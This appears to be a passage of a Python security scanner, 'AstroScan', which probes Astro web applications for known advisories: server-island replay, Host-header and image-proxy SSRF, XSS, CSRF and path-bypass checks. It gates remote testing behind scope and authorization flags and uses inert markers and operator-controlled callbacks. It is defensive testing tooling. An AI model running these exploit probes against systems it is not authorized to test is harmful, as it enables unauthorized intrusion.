    if not source or not destination:
        return None
    if not source.get("p") or not destination.get("e"):
        return None
    query = urllib.parse.urlencode({"e": destination["e"], "p": "", "s": source["p"]})
    return join_origin_path(target, f"/_server-islands/{target_name}") + "?" + query


def run_server_island_replay(client: HTTPClient, target: str, args: argparse.Namespace) -> Finding:
    token = uuid.uuid4().hex
    marker = f'<astro-scan-xss data-token="{token}"></astro-scan-xss>'
    page = client.request("GET", query_url(target, args.server_island_path, args.server_island_param, marker))
    body = page.get("_body", b"").decode("utf-8", errors="replace")
    replay_url = server_island_replay_url(
        target,
        body,
        args.server_island_source_name,
        args.server_island_target_name,
    )
    if not replay_url:
        return Finding(
            module="server-island-replay",
            identifier="CVE-2026-45028 / GHSA-xr5h-phrj-8vxv",
            title="Astro server island cross-component parameter replay",
            status="not-vulnerable-or-not-applicable",
            confidence="low",
            evidence={
                "page_request_id": page["id"],
                "page_status": page.get("status", page.get("error")),
                "source_component": args.server_island_source_name,
                "target_component": args.server_island_target_name,
                "reason": "Required encrypted source prop and target component export were not found",
            },
            remediation="Upgrade Astro to 6.1.10 or later and audit overlapping prop/slot names across server islands.",
            references=["https://github.com/withastro/astro/security/advisories/GHSA-xr5h-phrj-8vxv"],
            limitations=["The application must expose two server islands with the same prop/slot name and attacker-controlled source prop."],
        )
    replay = client.request("GET", replay_url)
    replay_evidence = raw_html_injection_evidence(replay.get("_body", b""), token)
    vulnerable = bool(replay_evidence.get("present") and replay_evidence.get("html_context") == "raw")
    return Finding(
        module="server-island-replay",
        identifier="CVE-2026-45028 / GHSA-xr5h-phrj-8vxv",
        title="Astro server island cross-component parameter replay",
        status="vulnerable" if vulnerable else "not-vulnerable-or-not-applicable",
        confidence="high" if vulnerable else "low",
        evidence={
            "page_request_id": page["id"],
            "page_status": page.get("status", page.get("error")),
            "replay_request_id": replay["id"],
            "replay_status": replay.get("status", replay.get("error")),
            "source_component": args.server_island_source_name,
            "target_component": args.server_island_target_name,
            "source_prop_ciphertext_sha256": sha256_bytes(server_island_params(body, args.server_island_source_name)["p"].encode()),
            "marker_evidence": replay_evidence,
        },
        remediation="Upgrade Astro to 6.1.10 or later; AEAD additional-data binding prevents prop/slot and cross-component replay.",
        references=["https://github.com/withastro/astro/security/advisories/GHSA-xr5h-phrj-8vxv"],
        limitations=["A positive requires the rare application shape from the advisory and proves raw HTML injection with an inert marker, not JavaScript execution."],
    )


class CallbackCollector:
    def __init__(self) -> None:
        self.events: list[dict[str, Any]] = []

    def handler_factory(self, token: str) -> type[BaseHTTPRequestHandler]:
        collector = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self) -> None:
                body = f"astro-scan-callback:{token}".encode()
                collector.events.append(
                    {
                        "timestamp": utc_now(),
                        "client_ip": self.client_address[0],
                        "method": self.command,
                        "path": self.path,
                        "headers": sanitized_headers(self.headers),
                    }
                )
                self.send_response(200)
                self.send_header("Content-Type", "image/svg+xml")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, format: str, *handler_args: Any) -> None:
                return

        return Handler


class CallbackServer:
    def __init__(self, host: str, port: int, advertise_host: str | None = None) -> None:
        self.token = f"{uuid.uuid4().hex}-{random.randrange(10**9, 10**10)}"
        self.collector = CallbackCollector()
        self.server = ThreadingHTTPServer((host, port), self.collector.handler_factory(self.token))
        self.advertise_host = advertise_host
        self.thread = threading.Thread(target=self.server.serve_forever, name="astro-scan-callback", daemon=True)
        self.thread.start()

    @property
    def url(self) -> str:
        host, port = self.server.server_address[:2]
        host = self.advertise_host or host
        display_host = host if ":" not in host else f"[{host}]"
        return f"http://{display_host}:{port}/astro-callback-{self.token}.svg"

    def stop(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=2)


def start_callback(args: argparse.Namespace) -> tuple[CallbackServer | None, str | None]:
    if not args.callback_listen:
        return None, args.callback_url
    if args.callback_url:
        raise ValueError("Use either --callback-listen or --callback-url, not both")
    parsed = urllib.parse.urlsplit("//" + args.callback_listen)
    if not parsed.hostname:
        raise ValueError("Invalid --callback-listen address")
    advertise_host = args.callback_advertise_host or (None if parsed.hostname == "0.0.0.0" else parsed.hostname)
    server = CallbackServer(parsed.hostname, parsed.port or 0, advertise_host)
    return server, server.url


def callback_token(callback_url: str) -> str | None:
    match = re.search(r"astro-callback-([A-Za-z0-9._~-]+)\.svg$", urllib.parse.urlsplit(callback_url).path)
    return match.group(1) if match else None


def wait_for_callback(collector: CallbackCollector | None, token: str | None, timeout: float) -> list[dict[str, Any]]:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        events = [event for event in (collector.events if collector else []) if token and token in event["path"]]
        if events:
            return events
        time.sleep(0.1)
    return []


def validate_callback(callback_url: str | None, controlled: bool) -> None:
    if not callback_url:
        return
    parsed = urllib.parse.urlsplit(callback_url)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise ValueError("Callback URL must be http(s)")
    if not controlled:
        raise ValueError("SSRF callbacks require --i-control-callback")


def run_host_header_ssrf(
    client: HTTPClient,
    target: str,
    args: argparse.Namespace,
    callback_url: str,
    collector: CallbackCollector | None,
) -> Finding:
    token = callback_token(callback_url)
    parsed_callback = urllib.parse.urlsplit(callback_url)
    callback_netloc = parsed_callback.netloc
    response = client.request(
        "GET",
        join_origin_path(target, args.error_path),
        headers={"Host": callback_netloc, "X-Astro-Scan": "host-header-ssrf"},
    )
    events = list(collector.events) if collector else []
    deadline = time.monotonic() + args.callback_timeout
    while not events and time.monotonic() < deadline:
        events = list(collector.events) if collector else []
        time.sleep(0.1)
    reflected = bool(token and token in response.get("_body", b"").decode("utf-8", errors="replace"))
    if collector is None and reflected:
        events = [{"source": "external-callback", "proof": "unique callback marker was reflected"}]
    vulnerable = bool(events and reflected)
    return Finding(
        module="host-header-ssrf",
        identifier="CVE-2026-54299 / GHSA-2pvr-wf23-7pc7",
        title="Astro prerendered error page Host-header SSRF",
        status="vulnerable" if vulnerable else ("callback-observed" if events else "not-vulnerable-or-not-applicable"),
        confidence="high" if vulnerable else ("medium" if events else "low"),
        evidence={
            "request_id": response["id"],
            "response_status": response.get("status", response.get("error")),
            "attacker_host": callback_netloc,
            "callback_events": events,
            "callback_response_reflected": reflected,
        },
        remediation="Upgrade Astro and the Node adapter to fixed versions, validate Host against allowedDomains, and override prerenderedErrorPageFetch safely.",
        references=["https://github.com/withastro/astro/security/advisories/GHSA-2pvr-wf23-7pc7"],
        limitations=[
            "Uses only the operator-controlled callback host; it does not probe internal addresses.",
            "A callback without reflection is outbound fetch evidence, not full response-disclosure impact.",
        ],
    )


def run_image_proxy_ssrf(
    client: HTTPClient,
    target: str,
    args: argparse.Namespace,
    callback_url: str,
    collector: CallbackCollector | None,
) -> Finding:
    token = callback_token(callback_url)
    request_url = image_proxy_ssrf_url(target, args.image_path, callback_url, args.image_format)
    response = client.request("GET", request_url)
    events = wait_for_callback(collector, token, args.callback_timeout)
    body = response.get("_body", b"").decode("utf-8", errors="replace")
    callback_token_returned = bool(token and token in body)
    vulnerable = bool(events or callback_token_returned)
    return Finding(
        module="image-proxy-ssrf",
        identifier="CVE-2025-59837 / GHSA-qcpr-679q-rhm2",
        title="Astro image proxy domain-validation bypass",
        status="vulnerable" if vulnerable else "not-vulnerable-or-not-applicable",
        confidence="high" if vulnerable else "medium",
        evidence={
            "request_id": response["id"],
            "response_status": response.get("status", response.get("error")),
            "href_scheme_bypass": "backslash",
            "callback_events": events,
            "callback_token_returned": callback_token_returned,
            "response_context": safe_text(response.get("_body", b""), 384),
            "proof_boundary": "The endpoint returned the unique callback token or made a request to the operator-controlled callback host, proving the domain check was bypassed.",
        },
        remediation="Upgrade Astro to a release containing both image-domain validation fixes and reject backslash-based URL forms.",
        references=["https://github.com/withastro/astro/security/advisories/GHSA-qcpr-679q-rhm2"],
        limitations=["Proves a controlled outbound request only; internal-network impact requires separate explicit authorization and testing."],
    )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True, help="Exact target origin, e.g. https://example.com")
    parser.add_argument("--scope", action="append", default=[], help="Authorized origin; repeatable")
    parser.add_argument("--allow-remote", action="store_true", help="Acknowledge that the non-local target is in scope")
    parser.add_argument("--authorization-statement", help="Traceable program/ticket authorization statement")
    parser.add_argument("--modules", default="fingerprint", help=f"Comma-separated modules: {','.join(SUPPORTED_MODULES)},all")
    parser.add_argument("--output", type=Path, help="Write JSON evidence to this path")
    parser.add_argument("--format", choices=("human", "json"), default="human", help="Terminal output format (default: human)")
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--delay", type=float, default=0.25)
    parser.add_argument("--fail-on-finding", action="store_true")
    parser.add_argument("--user-agent", default="AstroScan/1.0 (authorized-security-test)")
    parser.add_argument("--header", action="append", default=[], help="Extra 'Name: value' header sent on every request (e.g. a program's research header); repeatable")

    base = parser.add_argument_group("base-path bypass")
    base.add_argument("--base-path", default="/app")
    base.add_argument("--protected-path", default="/admin")
    base.add_argument("--marker", help="String that proves protected content was returned")
    base.add_argument("--base-bypass-suffix", default="X")

    version = parser.add_argument_group("Astro version fingerprint")
    version.add_argument("--version-path", action="append", default=[], help="Additional exact version-bearing URL path; repeatable")
    version.add_argument("--max-version-artifact-requests", type=int, default=8)
    version.add_argument("--version-probe-default-artifacts", action=argparse.BooleanOptionalAction, default=True)

    encoded = parser.add_argument_group("encoded-path bypass")
    encoded.add_argument("--single-encoding-depth", type=int, default=1)
    encoded.add_argument("--deep-encoding-depth", type=int, default=12, help="Twelve decode passes produce the advisory's literal depth-11 payload")

    source_maps = parser.add_argument_group("source maps")
    source_maps.add_argument("--sourcemap-path", action="append", default=[])
    source_maps.add_argument("--max-sourcemap-requests", type=int, default=20)
    source_maps.add_argument("--max-source-map-findings", type=int, default=3)

    server_island = parser.add_argument_group("server island parameter replay")
    server_island.add_argument("--server-island-path", default="/")
    server_island.add_argument("--server-island-param", default="shared")
    server_island.add_argument("--server-island-source-name", default="ComponentA")
    server_island.add_argument("--server-island-target-name", default="ComponentB")
    server_island.add_argument("--server-island-reflected-name", default="ComponentA")
    server_island.add_argument("--server-island-reflected-slot", default="astro-scan")

    ssrf = parser.add_argument_group("controlled-callback SSRF")
    ssrf.add_argument("--callback-listen", help="Start a callback listener, e.g. 127.0.0.1:0")
    ssrf.add_argument("--callback-advertise-host", help="Host reachable by the target when listening on 0.0.0.0")
    ssrf.add_argument("--callback-url", help="Operator-controlled callback URL")
    ssrf.add_argument("--i-control-callback", action="store_true")
    ssrf.add_argument("--callback-timeout", type=float, default=5.0)
    ssrf.add_argument("--error-path", default="/astro-scan-nonexistent")
    ssrf.add_argument("--image-path", default="/_image")
    ssrf.add_argument("--image-format", default="svg")

    xss = parser.add_argument_group("safe reflected-XSS checks")
    xss.add_argument("--transition-path", default="/")
    xss.add_argument("--transition-param", default="duration")
    xss.add_argument("--transition-directive-path", default="/")
    xss.add_argument("--transition-directive-param", default="persist")
    xss.add_argument("--spread-attrs-path", default="/")
    xss.add_argument("--spread-attrs-param", default="props")
    xss.add_argument("--custom-element-path", default="/")
    xss.add_argument("--custom-element-param", default="props")

    hono = parser.add_argument_group("astro/hono CSRF")
    hono.add_argument("--hono-csrf-path", default="/api/delete")
    hono.add_argument("--hono-csrf-method", choices=("POST", "PUT", "PATCH", "DELETE"), default="POST")
    hono.add_argument("--hono-csrf-origin", default="http://astro-scan-cross-origin.invalid")
    hono.add_argument("--hono-csrf-content-type", default="application/x-www-form-urlencoded")
    hono.add_argument("--hono-csrf-body", default="astro-scan-csrf-proof=1")
    hono.add_argument("--hono-csrf-marker", help="Exact harmless response marker proving handler execution")
    hono.add_argument("--allow-state-changing-check", action="store_true")

    remote_pattern = parser.add_argument_group("remotePatterns bypass")
    remote_pattern.add_argument("--remote-pattern-path", default="/_image")
    remote_pattern.add_argument("--remote-pattern-allowed-href")
    remote_pattern.add_argument("--remote-pattern-bypass-href")
    remote_pattern.add_argument("--remote-pattern-marker")
    remote_pattern.add_argument("--i-control-remote-host", action="store_true")
    xss.add_argument("--slot-path", default="/")
    xss.add_argument("--slot-param", default="tab")
    xss.add_argument("--define-vars-path", default="/")
    xss.add_argument("--define-vars-param", default="name")
    xss.add_argument("--trailing-slash-mode", choices=("never", "always"), default="never")
    return parser.parse_args()


def human_label(status: str) -> str:
    if status == "vulnerable":
        return "VULNERABLE"
    if status == "callback-observed":
        return "CALLBACK OBSERVED"
    if status == "astro-version-identified":
        return "VERSION IDENTIFIED"
    if status == "not-vulnerable-or-not-applicable":
        return "NO CONFIRMED FINDING"
    return status.upper().replace("-", " ")


def format_evidence_value(value: Any) -> str:
    if isinstance(value, bool):
        return "yes" if value else "no"
    if isinstance(value, (list, tuple)):
        return ", ".join(format_evidence_value(item) for item in value) if value else "none"
    if isinstance(value, dict):
        nested = [
            f"{key}={format_evidence_value(item)}"
            for key, item in value.items()
            if item is not None and item != [] and item != {}
        ]
        return "; ".join(nested) if nested else "none"
    return str(value)


def render_human_report(report: dict[str, Any]) -> str:
    versions = report.get("astro_versions", [])
    version_assessment = report.get("version_assessment", {})
    lines = [
        "AstroScan report",
        "================",
        f"Target: {report['target']}",
        f"Generated: {report['generated_at']}",
        f"Remote testing allowed: {'yes' if report['authorization']['remote_testing_allowed'] else 'no'}",
        f"Astro version: {', '.join(versions) if versions else 'not exactly identified'}",
        "",
        "Version-based advisory assessment",
        "-------------------------------",
        f"Matched advisories: {version_assessment.get('matched_count', 0)}",
    ]
    for advisory in version_assessment.get("advisories", []):
        aliases = ", ".join(advisory.get("aliases", [])) or "no CVE alias"
        lines.append(
            f"  [{advisory['severity']}] {advisory['id']} ({aliases}) — fixed in {advisory.get('fixed') or 'not stated'}"
        )
    lines.extend([
        "  Boundary: version matches identify upgrade candidates, not confirmed exploitability.",
        "",
        "Findings",
        "--------",
    ])
    for finding in report["findings"]:
        lines.append(f"[{human_label(finding['status'])}] {finding['module']} — {finding['title']}")
        lines.append(f"  Advisory: {finding.get('identifier') or 'n/a'}")
        lines.append(f"  Status: {finding['status']} ({finding['confidence']} confidence)")
        preferred = (
            "astro_version", "html_injection", "valid_source_maps", "callback_events",
            "callback_token_returned", "callback_response_reflected", "baseline_status",
            "bypass_status", "protected_marker_present", "response_status",
        )
        shown = set()
        for key in preferred:
            if key in finding["evidence"]:
                lines.append(f"  {key.replace('_', ' ')}: {format_evidence_value(finding['evidence'][key])}")
                shown.add(key)
        for key, value in finding["evidence"].items():
            if key not in shown and key not in {"request_id", "homepage_request_id", "signals", "note"}:
                rendered = format_evidence_value(value)
                if rendered != "none":
                    lines.append(f"  {key.replace('_', ' ')}: {rendered}")
        for limitation in finding.get("limitations", []):
            lines.append(f"  Limitation: {limitation}")
        lines.append("")
    lines.extend((
        f"Overall: {report['overall_status'].replace('-', ' ').upper()}",
        f"Modules executed: {len(report['findings'])}",
        f"HTTP transactions: {len(report.get('http_transactions', []))}",
        f"Evidence file: {report.get('output_file') or 'not written'}",
    ))
    return "\n".join(lines) + "\n"


def parse_extra_headers(values: list[str]) -> dict[str, str]:
    headers: dict[str, str] = {}
    for value in values:
        name, separator, content = value.partition(":")
        name = name.strip()
        if not separator or not re.fullmatch(r"[A-Za-z0-9!#$%&'*+.^_`|~-]+", name) or any(char in content for char in "\r\n"):
            raise ValueError(f"Invalid --header {value!r}; expected 'Name: value'")
        headers[name] = content.strip()
    return headers


def validate_args(args: argparse.Namespace) -> tuple[str, list[str]]:
    target = normalize_origin(args.target)
    parse_extra_headers(args.header)
    scopes = [normalize_origin(value) for value in args.scope]
    parsed = urllib.parse.urlsplit(target)
    local = is_local_hostname(parsed.hostname)
    if not local:
        missing = []
        if not args.allow_remote:
            missing.append("--allow-remote")
        if not scopes:
            missing.append("--scope <authorized-origin>")
        if not args.authorization_statement or len(args.authorization_statement.strip()) < 12:
            missing.append("--authorization-statement")
        if missing:
            raise ValueError("Remote testing refused; provide: " + ", ".join(missing))
    if scopes and target not in scopes:
        raise ValueError(f"Target {target} is not exactly listed in --scope")
    if args.delay < 0:
        raise ValueError("--delay cannot be negative")
    if args.timeout <= 0:
        raise ValueError("--timeout must be positive")
    module_values = set(args.modules.split(","))
    unknown = module_values - set(SUPPORTED_MODULES) - {"all"}
    if unknown:
        raise ValueError(f"Unknown modules: {sorted(unknown)}")
    requested = list(SUPPORTED_MODULES) if "all" in module_values else [module for module in SUPPORTED_MODULES if module in module_values]
    if ("base-bypass" in requested or "encoded-path" in requested) and not args.marker:
        raise ValueError("Authorization-bypass modules require --marker for reportable positive evidence")
    if "hono-csrf" in requested:
        if not args.allow_state_changing_check:
            raise ValueError("hono-csrf requires --allow-state-changing-check")
        if not args.hono_csrf_marker:
            raise ValueError("hono-csrf requires --hono-csrf-marker for positive state-change evidence")
    if "remote-pattern-bypass" in requested:
        missing = []
        if not args.remote_pattern_allowed_href:
            missing.append("--remote-pattern-allowed-href")
        if not args.remote_pattern_bypass_href:
            missing.append("--remote-pattern-bypass-href")
        if not args.remote_pattern_marker:
            missing.append("--remote-pattern-marker")
        if not args.i_control_remote_host:
            missing.append("--i-control-remote-host")
        if missing:
            raise ValueError("remote-pattern-bypass requires: " + ", ".join(missing))
    callback_url = args.callback_url
    validate_callback(callback_url, args.i_control_callback)
    if args.callback_listen and not args.i_control_callback:
        raise ValueError("--callback-listen requires --i-control-callback")
    return target, requested


def version_key(value: str) -> tuple[int, ...]:
    parts: list[int] = []
    for component in value.strip().lstrip("v").split("."):
        digits = re.match(r"\d+", component)
        if not digits:
            break
        parts.append(int(digits.group(0)))
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts[:3])


def version_in_range(version: str, introduced: str | None, fixed: str | None, last_affected: str | None = None) -> bool:
    current = version_key(version)
    if introduced not in (None, "", "0") and current < version_key(introduced):
        return False
    if fixed and current >= version_key(fixed):
        return False
    if last_affected and current > version_key(last_affected):
        return False
    return True


def applicable_version_advisories(version: str | None) -> dict[str, Any]:
    if not version or not valid_astro_version(version):
        return {"matched_count": 0, "advisories": [], "boundary": "An exact Astro version is required; fingerprints and partial versions are not advisory matches."}
    advisory_dir = Path(__file__).resolve().parent.parent / "advisories"
    matches: list[dict[str, Any]] = []
    for path in sorted(advisory_dir.glob("GHSA-*.json")):
        try:
            advisory = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            continue
        affected = False
        fixed = last_affected = introduced = None
        for package in advisory.get("affected", []):
            if package.get("package", {}).get("name", "").lower() != "astro":
                continue
            for version_range in package.get("ranges", []):
                if version_range.get("type", "").upper() != "SEMVER":
                    continue
                events = version_range.get("events", [])
                introduced = next((item.get("introduced") for item in events if "introduced" in item), None)
                fixed = next((item.get("fixed") for item in events if "fixed" in item), None)
                last_affected = next((item.get("last_affected") for item in events if "last_affected" in item), None)
                if version_in_range(version, introduced, fixed, last_affected):
                    affected = True
                    break
            if affected:
                break
        if affected:
            matches.append({
                "id": advisory.get("id", path.stem),
                "aliases": advisory.get("aliases", []),
                "severity": advisory.get("database_specific", {}).get("severity", "UNKNOWN"),
                "summary": advisory.get("summary", ""),
                "introduced": introduced,
                "fixed": fixed,
                "last_affected": last_affected,
            })
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MODERATE": 2, "LOW": 3}
    matches.sort(key=lambda item: (severity_order.get(item["severity"], 99), item["id"]))
    return {
        "matched_count": len(matches),
        "advisories": matches,
        "boundary": "Version matches identify upgrade candidates; exploitability requires the affected feature, route, input, adapter, dependency, and impact to be present.",
    }


def run(args: argparse.Namespace) -> int:
    target, modules = validate_args(args)
    callback_server = None
    findings: list[Finding] = []
    try:
        callback_server, callback_url = start_callback(args)
        client = HTTPClient(args.timeout, args.user_agent, parse_extra_headers(args.header))
        fingerprint_finding = run_fingerprint(client, target, args)
        findings.append(fingerprint_finding)
        version = next(
            (
                evidence["version"]
                for evidence in fingerprint_finding.evidence.get("version_evidence", [])
            ),
            None,
        )
        version_assessment = applicable_version_advisories(version)
        if args.format == "human":
            print(
                f"AstroScan preflight: {target}; exact version={version or 'not identified'}; "
                f"version-matched advisories={version_assessment['matched_count']}",
                flush=True,
            )
        for module in modules:
            if module == "fingerprint":
                continue
            elif module == "base-bypass":
                findings.append(run_base_bypass(client, target, args))
            elif module == "encoded-path":
                findings.extend(run_encoded_path(client, target, args))
            elif module == "transition-xss":
                findings.append(run_transition_xss(client, target, args))
            elif module == "transition-directive-xss":
                findings.append(run_transition_directive_xss(client, target, args))
            elif module == "spread-attrs-xss":
                findings.append(run_spread_attrs_xss(client, target, args))
            elif module == "custom-element-xss":
                findings.append(run_custom_element_xss(client, target, args))
            elif module == "hono-csrf":
                findings.append(run_hono_csrf(client, target, args))
            elif module == "remote-pattern-bypass":
                findings.append(run_remote_pattern_bypass(client, target, args))
            elif module == "slot-xss":
                findings.append(run_slot_xss(client, target, args))
            elif module == "define-vars-xss":
                findings.append(run_define_vars_xss(client, target, args))
            elif module == "dev-error-xss":
                findings.append(run_dev_error_xss(client, target, args))
            elif module == "sourcemaps":
                findings.append(run_sourcemaps(client, target, args))
            elif module == "server-island-replay":
                findings.append(run_server_island_replay(client, target, args))
            elif module == "server-island-reflected-xss":
                findings.append(run_server_island_reflected_xss(client, target, args))
            elif module == "host-header-ssrf" and callback_url:
                findings.append(run_host_header_ssrf(client, target, args, callback_url, callback_server.collector if callback_server else None))
            elif module == "image-proxy-ssrf" and callback_url:
                findings.append(run_image_proxy_ssrf(client, target, args, callback_url, callback_server.collector if callback_server else None))
            time.sleep(args.delay)

        parsed_target = urllib.parse.urlsplit(target)
        report = {
            "schema": "astro-scan-evidence/1",
            "generated_at": utc_now(),
            "scanner": "astro/tools/astro_scan.py",
            "target": target,
            "target_local": is_local_hostname(parsed_target.hostname),
            "authorization": {
                "scope": [normalize_origin(value) for value in args.scope],
                "authorization_statement": args.authorization_statement,
                "remote_testing_allowed": args.allow_remote,
                "policy": "Exact-origin authorization is required for non-loopback targets; SSRF checks use only an operator-controlled callback.",
            },
            "configuration": {
                "modules": modules,
                "timeout_seconds": args.timeout,
                "delay_seconds": args.delay,
                "marker_supplied": bool(args.marker),
                "extra_headers": sorted(parse_extra_headers(args.header)),
            },
            "astro_versions": sorted(
                {
                    evidence["version"]
                    for finding in findings
                    if finding.module == "fingerprint"
                    for evidence in finding.evidence.get("version_evidence", [])
                }
            ),
            "version_assessment": version_assessment,
            "findings": [dataclasses.asdict(finding) for finding in findings],
            "http_transactions": client.records,
            "overall_status": "vulnerable" if any(finding.status == "vulnerable" for finding in findings) else "no-confirmed-finding",
            "limitations": [
                "Astro fingerprinting is not version identification.",
                "Positive authorization-bypass evidence requires a supplied protected-content marker.",
                "SSRF modules do not probe internal services or use third-party callback hosts.",
                "CVE-2026-84383 memory-corruption input is intentionally not sent to remote targets.",
            ],
        }
        rendered = json.dumps(report, indent=2, sort_keys=True) + "\n"
        if args.output:
            args.output.parent.mkdir(parents=True, exist_ok=True)
            args.output.write_text(rendered, encoding="utf-8")
            report["output_file"] = str(args.output)
        if args.format == "json":
            print(rendered, end="")
        else:
            print(render_human_report(report), end="")
        print(
            f"Summary: {report['overall_status']}; {len(findings)} module result(s)",
            file=sys.stdout if args.format == "human" else sys.stderr,
        )
        return 1 if args.fail_on_finding and report["overall_status"] == "vulnerable" else 0
    finally:
        if callback_server:
            callback_server.stop()


if __name__ == "__main__":
    try:
        raise SystemExit(run(parse_args()))
    except (ValueError, OSError, socket.timeout) as exc:
        print(f"astro_scan: {exc}", file=sys.stderr)
        raise SystemExit(2)
